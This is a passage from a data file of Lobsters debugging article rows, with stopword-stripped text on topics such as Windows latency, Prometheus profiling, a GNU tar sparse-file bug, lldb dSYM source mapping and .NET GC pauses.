glass house system meaningless best misguiding worst case fact nt already established mental model glass house view noisy basically impossible build one everything correlate everything best poke thing randomly something appears work build mental model able make observation figure thing work evaluate consequence action model value directly proportional accurately let predict going happen providing visibility everything hurt help ever met experienced operation people asked debug network problem know tell tell use tcpdump wireshark use universal tool provided operating system work application whatsoever know never hear never hear go reconfigure application log output network traffic see going take time analyze log simply happen make long story short glass house provides little guidance people know looking people know looking usually go tool know already believe help glass house useful developer wrote read source code know probe rest people either overwhelmed information ignore wholesale instead go back layered view abstraction work view earlier various probe added operator never really see inside system bunch tiny stream slightly outdated data report going look experienced ops people thing find lot time use bunch probe placed operating system level might include thing like dtrace systemtap system log utils like perf top htop netstat probe let user operating system figure program interacting facility system look web server see log request response possibly configuration web server running port listening example thing extract generally log metric tracing provided explain thing using work meant let debug usage let repeat put bold application component use easy operate expose internals mainly aim provide visibility interaction mean want make system operable nt aim expose innards nt ask people aware implemented thing instead think consulting data expose entire department dedicated user experience ux nearly concept operator experience ox opex even though operator keep light critical power user looking abstraction diagram operating system aim provide probe let u debug interaction programming language give u tool let u understand debugger instrumentation vm dtrace probe possible framework build application provide observability u application developer better understand going finally app mostly expose operational data application user developer important layer build provide good observability u user implicitly force u compensate opacity level control directly glass house approach application log expose everything happens internally indistinctly operational success story unfortunate consequence building inadequate tool forced cope wrong layer abstraction abstraction layer time provide kind operator story want guide investigation first check user actually right thing systemwide application log distributed trace toplevel log metric investigation end probe make sense place individually key point user care investigation go deeper want check application work placing probe app misguided well app trusty right since suspect bug need put log everywhere instead find way put probe point framework use web rpc framework example might let get information middleware run value return framework one small set probe framework user let get quick view everything going costbenefit analysis clear get bang maintainable tool support operationally investigation still go deeper sure look languageprovided feature vm metric dtrace probe o tool experience convenience may even start lower level anyway particularly encounter performance issue rather behavioural bug provides broad view narrow particularly true know issue functionality want figure using provide visibility interaction internals allow people jump level according experience fact hoping operability would go far saying layer building nt support term observability considered right tool job feedback loop empathy important lesson encounter multiple type operator various mental model various approach system must take humancentric approach avoid glass house provide welllayered observability probe adapt specific type concern provide guidance flexibility operator difference system people operate various level experience system wizard thrive ca nt hope instill perfect model people still provide training help form accurate model well want understand operator better order better job catering need nothing like shoe developing finding hardtodebug issue try resolve production operator tool rather usual dev tool see available area stack render difficult introspect run time find needing add observability probe remember put right abstraction level probe added layer asbtraction one currently debugging provide insight interaction layer likely reusable bug way towards generic tool another interesting thing evaluate easy come model vocal propertybased testing lately particularly stateful property stateful property based writing model software get validated comparing real program hard time coming good model give useful property operator likely also going bad time figuring go system also suspect would true formally modeling thing tla writing highlevel documentation property test familiar getting direct feedback think trying hand explicitly modeling system part useful proxy bit like code coverage good code coverage way guarantee test good low coverage usually good sign test trustworthy easily come good model guarantee operator nt pretty good sign also hard time since people system always last hope resolving problem tooling automation fails plainly put effort supporting providing good operator experience
233,Lobsters,debugging,Debugging,The Curious Case of the 99.9% Latency Hike,https://mahdytech.com/2019/01/13/curious-case-999-latency-hike/,curious case latency hike,exposition data center latency qps nothing trigger something let debug profile profiler symbol xperf randomascii inside window debugging window performance toolkit wpt massive sampled cpu precise cpu event provider doc page fault resolution try free memory paging service tell u hardfaults,disclaimer story production changed couple detail gist story hold exposition normal morning checking health metric bunch service new service test caught attention let call service lucy lucy far pretty good perfwise stable latency across board memory cpu usage good world however day found latency hike several day looked latency counter looked something similar number averaged across hundred machine one data center also zoomin problem let assume following next couple day latency stay high latency much time take lucy respond request starting time receives request sends response back weird many reason first lucy new service le qps low compared similar service handling qps le latency second lucy pretty standard distributed load receive n document divide processing thread data lookup two return processing result load done expected le endtoend latency case lucy instance restarted problem go away latency back normal could ship lucy way happens production qps figure sooner later another interesting part problem occurred one data center data center fine excludes issue change rolled machine time whatever caused local however done nothing lucy new deployment time new data nothing nothing trigger something let debug naturally emptied schedule fired coffee machine dug profile first thing running profile using profiler profile usually useful showing cpu hot spot ease use lightweight report make usually first tool run unless clear sign root cause ran something close vsperf attach lucyexe file lucyprofilevspx sleep vsperf detach vsperfreport symbolpath srv symbol http msdlmicrosoftcomdownloadsymbols summaryfile packsymbols lucyprofilevspx basically attaching process min detach finally vsperfreport used add needed symbol report resulting vsps file opened using profile tool visual studio used capture typical cpu profile look like favorite feature xperf expand hot path bonus point guess famous window app preview profile show anything unusual taking cpu even profile healthy machine two profile looked similar decided move xperf next ran xperf swiss army knife live profile xperf big advantage noninvasive almost negligible effect perf running apps highly customizable suffers pretty steep learning curve randomascii excellent uptodate xperf resource highly recommend blog also recommend inside window debugging dissects xperf put reader track using xperf proficiently note xperf seems rebranded window performance toolkit wpt also downloaded window store actually recommend using window performance recorder wpr tool record etw trace prefer use xperf command line tool shown wpr default produce massive trace inconvenient move around contain much information firsttime user analyzing trace window performance analyzer wpa way go hand profiler provided sampled cpu info time get precise cpu info sampled cpu profile capture call stack regular time interval ie take sample hand precise cpu profile capture context switch across thread turn help detect lock long io wait ran something close xperf procthreadloaderbasecswitchdispatcher stackwalk cswitchreadythread buffersize minbuffers maxbuffers sleep xperf stop explanation run xperf capture event well call stack context switch keep running one minute stop capturing event output captured trace note order get list available event provider run xperf provider k see doc possible stackwalk argument let take look sampled v precise cpu profile wpa unfortunately nothing new precise cpu run callstack usual timewasters nothing special tried run xperf different parameter xperf procthreadloaderdiskiohardfaultsallfaults stackwalk hardfaultpagefaultdemandzeropagefaulthardpagefaulttransition tat focus disk issue page fault yield anything either going made mistake analysis far figured resolution granularity capturing min trace qps latency le request aggregation interval capturing minute profile miss actual problem solved running another diskfocused xperf lo behold bad guy couple hard fault case actually solved yet caused hard fault blue nothing indeed changed lucy already checked lucy memory graph although pointing decrease working set size provide clue trigger know lucy got swapped suspected another process responsible time checked whole ecosystem culprit stood lucy alone another team service also life memory leak around time latency hiked graph show memory leak kernel run low available physical memory try free memory paging service scenario lucy victim working set written page file team quickly realized fixed issue tell u shortly fix lucy paged memory swapped back working set part accessed frequently kernel decided leave paged however request every several minute needed access paged memory couple request experienced hardfaults turn hiked latency realized leak emailed team asking confirmed actually case worry solved interesting note lucy getting qps kernel would probably swapped rest paged memory back working set problem would sense le load caused latency issue good news problem worried production restarted lucy instance issue mitigated good learned much debugging issue lot fun think lot takeaway especially lack communication trigger series event let know thought comment
234,Lobsters,debugging,Debugging,"Secret Writer's Society, the best way to swear at children in 1998",https://obscuritory.com/educational/secret-writers-society/,secret writer society best way swear child,undetected bug first discover supposed glitch rtmark claimed october work internal sabotage told beta version game dated november old website reader pointed memory management issue producer makoto morise implemented swear filter although company thought tested stretching truth action download uploaded version internet archive additional reference http,panasonic interactive medium game secret writer society supposed teach kid write well instead became infamous game texttospeech feature would read back wrote right circumstance macintosh version game would read list obscenity instead computer revolutionizing education sometimes surprising way software teach kid cuss like drunken stevedore raved robert cwiklik wall street according pim marketing manager kari gibbs company begun replacing copy secret writer society june four month originally shipped february panasonic blamed issue undetected bug would accidentally read word program language filter computer slow memory another story andrew maisel first discover supposed glitch reported educational software review website superkids say reproduced healthy power mac lot memory shocking hilarious twist anticorporate activist group rtmark claimed october work internal sabotage according statement anonymous programmer contracted panasonic said trying call attention danger parent handing responsibility computer game letting thirdrate piece software take wrong violates contract said crime crime letting profit get way education rtmark said awarded programmer action panasonic insisted rogue program result bug elizabeth olson panasonic communication manager told independent november knowledge truth claim rtmark seem claiming responsibility something anything rtmark ray thomas also told independent could really think bug either way damage panasonic interactive medium shut month later march consumer electronics blamed secret writer society harming group secret writer society quickly forgotten probably panasonic relief missing ever managed get copy week yes version swears inside secret writer society mission control game series seven writing lesson framed test induction secret writer society mysterious underground club writer entice child think like secret mission rather writing instruction full copy game came society membership card spystyle writing supply like decoder pen bonus accessory disguise secret writer society really rote exercise formal writing structure teach punctuation capitalization ordering sentence paragraph functional part writing explained crummy school house rockstyle music video imagination program like mecc storybook weaver edmark imagination express colorful picture fantastical setting inspire kid dream story tell comparison game get creative writing prompt final lesson minute punctuation drill even focus proofreading teach write write membership card would cool might inspiring two place game freewriting final lesson diary feature bad stuff happened clicking read button make program read back wrote macintosh version game interrupt click read button happens lot subtler expected whole stream obscenity read snippet swear filter list pretty long list somewhere around word variation word written cap spelled instead yes hear video one word penus case kid spelled wrong cdrom label say copy secret writer society version file modified game original february release date maisel report superkids said corrected replacement copy version mean game revised rereleased least anyone noticed problem incredible strong museum play rochester ny beta version game dated november earlier week visited museum played help digital game curator andrew borman found game swear filter filter related problem late addition development game fourth version released phonics reading writing company known learning upgrade say old website owned trademark secret writer society must acquired panasonic interactive medium closed happening click read button mac version game pause second load text click game start loading text keep reading meantime soon hit punctuation begin reading random point swear filter list instead text finish loading wrote short paragraph might hear single letter wrote hear many forbidden word related game loading speed would explain maisel reported happened long passage panasonic say issue occurred slower computer memory issue turn sabotage fact bad bug since article published reader pointed problem appears memory management issue comment tomysshadow find evidence tampering macromedia director lingo code based close together text passage swear filter kept program memory way macintosh version reloads text pausing program continuing read seems cause read wrong place memory panasonic olson said producer makoto morise implemented swear filter although company thought tested evidently test well enough rtmark cofounder igor vamos confirmed via email sabotage story made bug deliberate appearance would cry shame pile additional layer provocative story vamos rtmark history stretching truth action story secret writer society big fib believable swear filter really implemented badly game kinda shoddy trouble saving diary entry keeping track user icon selected occasional error message macromedia director mac version accidentally included random desktop file disc act sabotage could made final product game slipshod nobody would noticed actually end making rtmark point rtmark made story rebellious programmer raise concern parent willing trust piece software teach child sure know program work tested well like problem continues relevant today program algorithm understand continuing influence life like youtube recommendation engine gradually pointing viewer rightwing extremist video case software roughly assembled little creative imagination secret writer society blame skeptical article revised july incorporate new information bug reader well igor vamos comment thanks vamos responding everyone analyzed program reveal evidence tampering download interest preservation uploaded secret writer society version internet archive additional reference cwiklik robert june honest mom even know word mean wall street journal p retrieved http panasonic interactive medium feb keep secret panasonic interactive ship secret writer society press release retrieved http panasonic yank kid program curse june communication daily retrieved factiva panasonic fold medium group march consumer electronics retrieved lexisnexis vamos igor july personal communication
235,Lobsters,debugging,Debugging,Optimising startup time of Prometheus 2.6.0 with pprof,https://www.robustperception.io/optimising-startup-time-of-prometheus-2-6-0-with-pprof,optimising startup time prometheus pprof,release pr runtimepprof keep current head chunk series data structure got back later perworker cache id got sample needed fixing contact u,release prometheus includes wal loading optimisation make startup faster informal design goal prometheus tsdb startup take minute past month report taking quite bit problem prometheus restarts reason almost time loading wal write ahead log sample last hour yet compacted block finally got chance dig end october outcome pr reduced cpu time walltime let look arrived improvement firstly need test setup created small go program produced tsdb wal billion sample spread across ten thousand time series opened tsdb saw long took using time utility bash builtin nt include memory stats also created cpu profile using runtimepprof package f err oscreate cpuprof err nil logfatal err pprofstartcpuprofile f defer pprofstopcpuprofile cpu profile nt tell u directly walltime care strongly correlate result desktop machine cpu ram ssds taking minute load peak bit ram resident cpu k pagefaults nt great let load profile go tool pprof cpuprof see time spent top command flat amount time spent given function cum time spent given function function called also useful view information graph get feel thing prefer web command option including svg png pdf file see third cpu spent adding sample inmemory database two third processing wal overall quarter garbage collection runtimescanobject let look code first list memseries append stand half time spent getting head chunk series line good portion time also spent finding number sample chunk line time spent appending line nt surprising core function expect dominate runtime looking memserieshead figuring chunk return time chunk change every appends keep current head chunk series data structure cost small bit ram got back later save significant amount cpu also make general prometheus ingestion faster next let look headprocesswalsamples append already optimised next obvious culprit look getbyid line look like lock contention time spent lookup two level map perworker cache id cut nicely looking headprocesswalsamples time spent line surprising step back bit wal loading work headprocesswalsamples goroutine created every cpu addition one read decode wal disk series sharded goroutines parallelism taken advantage way implemented sample sent goroutine process one need sends sample goroutine process one need last headprocesswalsamples goroutine sends everything back controlling goroutine spread appends across core want also lot duplicated work goroutine process sample modulus calculation fact core work duplicated changed sharding conroller goroutine headprocesswalsamples goroutine got sample needed saved small amount walltime machine goroutines running noticeable amount cpu benefit machine core quite bit larger leaf one thing stood time spent garbage collection something usually spot via cpu profile instead need look heap profile see thing allocated need bit code near end program runtimegc hf err oscreate heapprof err nil logfatal err pprofwriteheapprofile hf explicit garbage collection heaprelated information collected garbage collection time use tool though specifying allocspace flag care total allocation rather using memory right go tool pprof allocspace heapprof looking top allocaters obvious culprit looking code seems sample array expanded issue could reuse array across call recorddecodersamples would save lot allocation turn code written work way subtle coding error meant nt working fixing lead gc using second cpu time rather second overall result quite noticeable cpu k pagefaults addition reducing wall time cpu resident memory also dropped may seem almost easy due reasonably familiar codebase benefit hindsight spend quite bit time pouring code several dead end removing call numsamples reading decoding separate thread variant processwalsamples sharding worked fairly certain gained adjusting number goroutines properly need tested machine core hand given already gotten performance improvement looking best make pr large went done far want improve performance monitoring contact u
236,Lobsters,debugging,Debugging,Tracing a closed-source Linux-binary behavior,https://medium.com/cloud-niners/tracing-a-closed-source-linux-binary-behavior-5dc0bc2db641,tracing closedsource linuxbinary behavior,tracing closedsource linuxbinary behavior sigkill er loose oom killer man page linux pid namespace,tracing closedsource linuxbinary behavior sigkill er loose support multiple client chip design industry tool industry us linux based o love support problem report get old stuff recently however user reported fairly interesting issue user run scientific simulator app vnc session crash simulator app allocates around ram crash let run app reproduce issuethe first step debugging anything usually reproduce itrunning app take time allocated roughly gig ram sure enough reported crash take vnc vnc killed show systemd logthis pretty repeatable first thought server ram suspected oom killer loose nope log contained trace running ram also server still plenty free ram thinking might tigervnc bug ssh ed server switched user account ran tool ssh surprisingly tool crashed took su session running simulator sshsu crash kick root simulator crashing ok book would kill su something fishy every single process owned user vnc et al also died annoyed bec see behavior convincing reason tell user dig deeper since memory vnc bug could something else killing process theory time test since kernel box fairly old systemtap available enough fired quick snippet compiled loaded kernel ran tool againsystemtap script determine killing processeswaited bit simulation tool initial work right crash saw belowclosed source linux binary killing every process could touch wow sort confirmed doubt process crashing deliberately killed non simulator tool pretty weird still doubt wanted confirm line thought ran binary one time right supposed crash attached trusty old strace itlinux binary issuing sigkill pid mean user process confirmed doubt binary calling kill send sigkill sending pid according man page mean send signal every process kill pretty weird least thing starting make sense got sigkill er loose trying contain killer thought contain separate linux pid namespace performed quick experiment seen unshare ing pid namespace forking new csh separate pid namespace indeed able kill process simulator able kill vnc yaayrunning isolated process separate linux pid namespacei performed experiment ran simulator app indeed able kill vnc process owned user still kill making experiment much le practical use next line thought try contain use gdb breakpoint app calling kill indeed catch syscall kill helpful however app used lot kill call trying skip would hard automate also thought preloading shim glibc override kill even altering kernel call table motivated enough follow solution especially situation happening first place probably application bug fixed later update well fun ride would like team support linux server devops process please click send message leave comment cheer
237,Lobsters,debugging,Debugging,Retro debugging,https://wozniak.ca/blog/2019/01/04/Retro-debugging/index.html,retro debugging,book review retro debugging capsule review cover experimental avantgarde cinema aid,book review retro debugging fifth series review debugging book frozen keyboard living bad software boris beizer tab book pp secret software debugging truck smith tab book pp debug personal computer jim huffman robert c bruce reston publishing pp software debugging microcomputer robert c bruce reston publishing pp program style design efficiency debugging testing ed dennie van tassel prenticehall pp program debugging ar brown wa sampson american elsevier computer pp debugging technique large system edited randall rustin prenticehall pp part reason started series book review get feel approach debugging changed year similarly interested seeing stayed perhaps parading around different guise end collected debugging book published used following methodology totally completely based rigorous technique practised academic setting search book published title combination title cover author seemed price copy read theme content aside save book recommendation happens book fall two different computing era mainframe computing personalhome computing also happen line publication date mainframe personal glean much debugging current day age read find enlightening contrast parallel note book really general book home computer user book process software development debugging considered part home computing book although discus software developed particularly tested state software computer time included review good book help provide context era aside specific amusingly date almost primary difference demonstrate world speed every single aspect development come across slower making change code running let alone deploying could take order day brown book describes case study run contains specification program today would best assignment first year student competent developer would probably able write day unit test case study take two professional programmer year experience nearly two week effort get working program ludicrous may seem big reason lack machine time case study contains detailed program development log one programmer programmer logged day development time minute machine time take day get point even start writing code likelihood end card tedious errorprone input mechanism mainframe era book allude fact cpu time cost money often used many thing word developer almost never computer work initially wrote code desk paper certainly terminal time sharing operating system accurate assume programmer using punch card submit program batch computer nevertheless significantly le computing power storage space today much expensive hence mainframe era book consistently push notion aim right first avoid wasting cpu cycle book home computing go extent obvious reason computer right front although would stretch say development speedy affair truck book contains programming journal recorded writing three different program apple ii one simple difflike program written basic end little line including comment reflecting effort reading blow blow description page worth give impression took long time write program get running actually took week working night every night week home computing book devoid discussion software tool development debugging including something rudimentary text editor assume use basic interpreter primitive nonmultitasking operating system come computer input manage program smith also journal pascal assembly language program hint go actually using language computer assumption user knowledge obtain necessary software use different programming language book centre entirely limited capability basic sol microcomputer home computing world come immediate computing power little way taking advantage lack speed go handinhand debugging talked distinct stage software development almost exclusively portrayed offline activity explicitly stated mainframe book also true home computing book although definition shift slightly look debugging tool technique book describe one item rule printed output nearly everything geared toward making program listing diagnostic output efficient useful like thing book strike reader day age ridiculous still entirely reasonable given condition time recall mainframe domain cpu time precious running automated test using tool query output something like grep may difficult impossible world home computing merely inspecting program monitor without obtaining extra software likely chore limited memory disk ram holding output even pager program much could stored cheapest abundant source storing output purpose inspection paper given paper characterized preferred method debugging surprising debugging talked something separate programming probably starkest difference method program output easily stored examined making debugging practically synonymous development bruce talk development stage van tassel say one plan debugging take four time long planning writing testing brown book start decrying fact much time spent debugging practically every paper collection edited rustin assumes debugging independent act programming surprising output removed runtime environment development process feel delineated le fluid debugging technique however markedly different smaller scope point modern environment really think technique everything prescribed instrumenting program tease information state still applicable although may necessary first desk checking reading program listing possibly making flow chart running example manually exactly step recommended depends whether reading mainframe book write code home computing book run code need make flow chart pretty rare day since quickly navigate code online understand control flow due abundance computing power storage space also easy execute example code store automated testing anyone desk checking form last resort today primary technique past technique talked great length careful judicious placement print statement come tool used online computing environment print statement one mentioned home computing book online debugger breakpoints program halting memory inspection also system tool since whole computer devoted running program writing mainframe book talk systemlevel monitor online debugging done way suggests exotic luxury le got tool described system specific treatment would place book general debugging use memory dump talked mainframe book saying hard work probably examine online probably want avoid end reliable technique use anywhere wellplaced print statement advice place largely today attention paid avoiding extensive output since would use lot paper mentioned mainframe book see debugging stage software development home computing book contrast barely discus notion process book completely ignore program got written dive fix existing one program provided come existence contrived narrative sake presentation book spends limited space development formality buries advice enjoyable haphazard experience report debugging basic program something get done fast editrun cycle caveat paucity feature environment make le appealing sound probably home computing book push offline debugging much lack rigour home computing book carry testing testing debugging closely related frequently discussed together bit surprising serious mention home computing book set smith touch talk much test bruce huffman completely ignore subject embarrassing beizer provides insight test software even superficially book directly aimed programmer even shameful beizer go wonderful witty demonstrates deep knowledge subject lack testing discussion home computing book relegates realm amateur mainframe book hand serious testing act clear emphasis isolating part program testing regular basis especially change made practice testing module mentioned often process drawn description brown sampson involves multiple people write program type run van tassel say using automated testing way handle large code base storing test input reused necessity keeping log test test result recommended desk check routine testing play key role managing one debugs program included testing discussion lot hopefulness one day proving program correct complete healthy dose skepticism serious expectation happening soon differs today scope example merely checking type modulefunction boundary let alone within function referred may require multiple compiler since optimizing compiler probably verify type emphasis getting compiler check much possible resource available compiler check thing first place usual resource run test constrained compilation took significant amount time description tested programmer generally limited single module something order implementing equation file operation debugging mainframe home computer early come across tedious exercise mainframe book practically feel author pining power potential nothing realize mostly development process played superslow motion least methodical home computing book hand severe lack discipline probably large part due use basic grounding point although truck smith try hard branch little collection book show past lot attention paid thing mostly ignore thing found period time emerge wait anything happen clear advantage wealth computing power available come debugging able capture gigabyte output number tool analyze short order machine program running significantly better worrying whether print statement send hundred page output line printer introspection tool current execution environment offer realization yearned mainframe book get reap reward revelatory seeming lack formality home computing everyone enamoured fact computer home forgot computer work complaint book may well attributed lesson found smith bruce work enough book explain discrepancy thoroughness certainly something explore one thing clear thing change stay get faster capsule review interested specific book included short review really keen book want read forewarned unless want study historical context learn much actual content except one case appreciating content requires research possibly experience actual computing environment referenced book frozen keyboardfive star beizer pleasure read clear prose pointed metaphor backhanded compliment elegantly excoriate tech industry hyped promise general lack empathy user lot aside buying guide extensive backup procedure using applies amusingly colourful talking programming bug exist description start teaching software testing usability put book supplemental reading list recommended discussion drink shout john regehr pointing work secret software debuggingthis book mentioned another book reviewed debugging thinking metzger described targeting obsolete languageenvironment historical interest hell book actually fun somewhat insightful despite dearth rigour truck smith clearly programmer writing aspiring programmer content thin lot grasping formality discussion mindset attitude need tackle tough debugging problem still resonates also three long chapter journal developing three different program one first pascal program help appreciate went developing home computer added bonus edition come cover whose genesis demand explanation debug personal computerthis condensed version software debugging microcomputer containing select chapter extra chapter devoted describing hardware time hardware chapter dull probably help debug hardware rest original book save fact tell personal computer code sol microcomputer software debugging microcomputersreview le ten word page print statement example program basic design questionable discussion drag experimental avantgarde cinema concept could explained page instead weaved development medium sized program come grandiose description pedestrian implementation furthermore name known studied concept time given strange name subroutine testing edge case subroutine name pity anyone learned book go condensed cousin mentioned program style design efficiency debugging testingvan book probably good one shelf professional programmer student programming late topic germane programming time presented seriously care advice superseded obsoleted guided wrong direction reading lot programming exercise provided would still enjoyable tackle description strange dated feeling place modern text incredible coincidence found passage plagiarized program debugging book least reference program debugginga strange little book describes formal approach debugging author call method based problem solving technique used manager study specification look difference hypothesize exist look program determine correct verify correct like reading business book claim scientific management science successful interesting case study using method real programming environment well documented fascinating read also sexist passage page van tassel rip assume program survive sabotage attempt crosseyed punch girl cretinous data control clerk idiotic van tassel page excise sexism shift insult robust program able survive crosseyed keypunchers cretinous data control clerk retarded debugging technique large systemsthis collection paper talk summary symposium held also earliest book debugging could obtain mostly provides historical context making clear interactive debugging good idea difficult pull given lack resource diversity hardware time fair bit discussion using compiler prevent bug thing like typographical error basic type checking lot talked taken granted today provide view world programming limited environment also learned unfortunately named debugging system aid know home computing book microcomputer era talk program development debugging know popular reference programming home computer early appreciate email pointing
240,Lobsters,debugging,Debugging,Attaching sources to iOS/macOS binaries compiled on another machine,https://medium.com/@maxraskin/background-1b4b6a9c65be,attaching source iosmacos binary compiled another machine,attaching source iosmacos binary compiled another machine background seeking solution stackoverflow little symbol iosmacos attaching dsym manually please http http wwwexamplecommystuffframeworkdsymzip found http lldbllvmorgsymbolshtml http update july script,attaching source iosmacos binary compiled another machinebackgroundour ci build several io framework deployed artifactory ready consumption clientsrecently framework crash used client naturally wanted attach offending app debugger step code ala trivially xcode simple way telling symbol source directory atseeking solutionnaturally went ahead google find proper solution turned stackoverflow put bounty questionsome time later received reply guy go name jim ingham quick search curiosity turn one lldb principal engineer apple awesome first order source knowledge little symbol iosmacosat first misconception enough symbolic source map data embedded debug binary framework thats enough fact data read either two place intermediate object file machine frame compiled ci machine case portable unless hack around shoudln dsym package generated debuginformationformat set dwarfwithdsymthis portable usable however absolute path source embedded itattaching dsym manuallyafter getting answer stackoverflow went ahead tried manual process attaching source simple follows dsym machinei started xcodeset breakpointlaunch appwhen breakpoint got hit typed following command lldb console adddsym pathtothedsymimage lookup vn someglobalsymbolzthis printed absolute path source code file symbol resides eg usersjenkinsmyprojectsrcsomeglobalsymbolsourcecppnow remap source path usedsettings set targetsourcemap usersjenkinsmyprojectsrcsomeglobalsymbolsourcecpp usersmaxmyprojectsrcsomeglobalsymbolsourcecppnote map multiple sourcemaps thus setting set targetsourcemap able step source symbol binary framework debug please process previous section tedious fun use time automated ityou grab python script http usage example python dsymsymbolizerpy dsymurl http wwwexamplecommystuffframeworkdsymzip sourcepath usersmemyselfandimystuffsources binarypath usersmemyselfandimyprojectpodsmystuffmystuffframeworka ruby version script found herethanks fellow coworker ben asher making ruby portnote ruby port requires dsymnow automation actually whats written previous section actually whats described http lldbllvmorgsymbolshtml guesstimation thrown script look binary try match embedded path local path using following algorithm downloads dsym remote urldsyms put dsymsexecutes nm utility binary guestimate embedded source path using following logic let assume sourcepath mypath potentialoriginalpath remoteplacefoobarbaz attempt see mypathbaz exists mypathbarbaz mypathfoobarbaz return generates mapping plist architecture mapping data put contentsresources within dsym packagehere example plist xml version encoding doctype plist public appledtd plist http plist version dict key dbgarchitecture key string string key dbgbuildsourcepath key string userssharedjenkinshomejobsmyappworkspacemyappcore string key dbgdsympath key string usersmaxdsymsmyappdsym string key dbgsourcepath key string usersmaxprojmyappmyappcore string key dbgsymbolrichexecutable key string usersmaxprojmyappmyappiospodsmylibcorelibmyappframeworkmyapp string dict plist run xcode lldb automatically pick dsym let debug binary machine note must rerun script binary get changed happy debugging update july also ruby port script thanks go coworker ben ashernote ruby port requires dsym local path
241,Lobsters,debugging,Debugging,"Beagle from scratch, or: adventures in JTAG, part 1 (2014)",http://www.shrike-systems.com/beagle-from-scratch-or-adventures-in-jtag-part-1.html,beagle scratch adventure jtag part,ben gras blog beagle jtag rtems beagleboard beagleboard xm reset barren wasteland uboot initialization done mlo want test rtems mentioned bsp beagle rtems chris jtag initializing board jtag code rtems code rtems tester code running rtems test,published sat april ben gras blog tag beagle jtag rtems story learned take boot beagleboard beagleboard xm reset barren wasteland without boot code uboot running first little actually working noticeably usable uart external ram quite lot initialization necessary usable state available ram soc also rom contains code first thing start executing reset initialization done usual case reset rom boot code search boot device find secondstage bootcode executed ram task initialize ram necessary peripheral next stage bootloader loaded executed executable called mlo ti parlance fulfilled spl build uboot rom boot code smart enough parse partition table fat filesystem load mlo onsoc ram mlo mmc boot device possible also mlo uboot mlo initializes whatever plls clock controller ram necessary get working uart external ram mmc device able load full uboot mmc device ram execute full uboot much peripheral support supporting feature load next step ie operating system application want test rtems mentioned working bsp beagle family product rtems word port rtems beagle specifically beagleboard xm beaglebone white beaglebone black friend chris testing bsp introduced powerful notion might call runningfromscratch specifically getting hardware reset state load run rtems binary absent boot loader eliminates lot dependency kind state bootloader might leave hardware also eliminates needing external software load run rtems unattended testing taken jtag running without boot code affords u full control full system state known advantage work u work everywhere bootloader eliminated dependency determining system state rtems binary start running disadvantage figure load rtems executable get hardware usable state without help mlo uboot jtag initializing board jtag approach duplicate initialization procedure uboot spl ie mlo jtag executed qemu traced memory io operation us initialize hardware could recreate openocd series writes reset board initialize every gdb attachment run rtems executables jtag without additional software needed code rtems code contains openocd configuration initialize beagleboard rtems tester code contains gdb configuration necessary control openocd properly load execute binary also setting proper breakpoints let test pas post full tutorial build run everything future running rtems test next step build run rtems test beagleboard xm unattended also post update test running
242,Lobsters,debugging,Debugging,How I wound up finding a bug in GNU Tar,https://utcc.utoronto.ca/~cks/space/blog/sysadmin/TarFindingTruncateBug,wound finding bug gnu tar,fileservers hunting null byte text file new linux fileservers sparsecs ran nfs problem alpine run gnu tar file shrink tar reading tar fails properly handle resulting earlier expected end file compressing filesystem backup anyway commit,every often something happens work make think even nt know conclusion really draw recently mentioned found bug gnu tar story happened one time back fileservers amanda gnu tar long time problem every often fortunately quite rarely tar would freak backing filesystem held varmail producing huge amount output time would go forever kill dump eventually time would eventually finish produced terabyte output fortunately seemed compress well one point captured giant tar file subjected inspection revealed runaway area giant sea null byte tar nt like thing returned normal led wondering null byte naturally occurring people inboxes turn hunting null byte text file quite easy like yes people inboxes recently moved filesystem varmail new linux fileservers ubuntu recent mainline version gnu tar omnios machine hoped would solve gnu tar issue almost immediately one runaway tar incident occur time around gnu tar running ubuntu machine felt fully familiar debugging tool available inspection running tar process inspection revealed tar issuing endless stream read returning byte read read read write read lsof said file descriptor someone mailbox using aptget source tar fetched source code ubuntu version gnu tar went rummaging around read system call nt check end file decoded level indirection turned one obvious place seemed skip sparsedumpregion function sparsecs little light went head month ago ran nfs problem alpine working bug strace alpine process noticed among thing using ftruncate change size mailbox sometimes extended temporarily creating sparse section file filled perhaps sometimes shrunk seemed match spotted sparseness related shrinking file size ftruncate would create situation tar hit end file expecting even provides explanation tar sometimes recovered something later delivered mail mailbox taking back size tar expected tar would stop getting unexpected end file poking around gdb using ubuntu debugging symbol tar package source code fetched reproduce bug although somewhat different initial theory turn sparsedumpregion dumping sparse region file dumping nonsparse one course used file sparse run tar sparse argument actual bug run gnu tar sparse file shrink tar reading tar fails properly handle resulting earlier expected end file file grows tar recovers except file sparse end shrink purely sparse section case okay interesting nothing could done year ago omnios fileservers theory omnios way tracing program system call activity general equivalent lsof could probably found looked source code version gnu tar run omnios debugger although nt seem version gdb installed nt instead shrugged bit moved took moving filesystem ubuntu based environment get dig issue nt issue tool environment either part automatically assumed omnios version gnu tar old unsupported version reason look surely issue fixed newer one p short term fix likely tell amanda run gnu tar without sparse backing filesystem mailbox nt sparse compressing filesystem backup anyway null byte compress really well pps nt tried report bug gnu tar people confirmed friday university winter break interested party feel free beat update bug reported gnu tar people fixed commit
243,Lobsters,debugging,Debugging,A Meta-Programming Technique for Debugging Answer-Set Programs,https://publik.tuwien.ac.at/files/PubDat_167810.pdf,metaprogramming technique debugging answerset program,,obj stream c pmǚ
244,Lobsters,debugging,Debugging,War Story – The Mystery Of The Very Long GC Pauses in .NET Windows Service,http://tooslowexception.com/scenario-mystery-of-the-very-long-gc-pauses-in-net-windows-service/,war story mystery long gc pause net window service,tamir dresher clarizen rxnet action gc duration minute smell like environmentinfrastructure problem investigation abnormal long unexplainable wait never see callstack production solution dmitry rudakov bug background gc issue considered fixed conclusion net gc misconfiguration net gc bug bug application code injected module antivirus software creating subtle memory corruption gc innocent victim solving often mix expertise intuition bit luck rarely analysis run straight one planned point another,part consultancy job pleasure help various customer problem could described collectively gcrelated memoryrelated general one day tamir dresher clarizen company btw author rxnet action contacted extremely interesting message emphasis mine experiencing phenomenon gc duration minute backend server think session perhaps idea find root cause minute infinity see something like one thought come mind something really serious must happening nowadays problem may diagnosed remotely signing ndas could go straight attacking problem clarizen provided wellprepared concise summary architecture current finding internal monitoring tool based kibana indeed looked gc introduces endless pause netbased window service completely freezing job processing represented incoming message rabbitmq example single day monitoring showing number various job different bar colour processed per time clearly every hour mysterious gap representing even long processing period job processing pause day engineer clarizen connected pause time gc measurement hitting value minute time gc measurement day process size hit gb maximum small sure reason gigantic pause introduced observed pause could correlated event metric including generation size overall cpu usage mystic time gc hitting minute unfortunately problem could reproduced ad hoc interesting happening one server cluster others smell like environmentinfrastructure problem investigation even first thing wanted make sure gc mode process running window service treated desktop application run 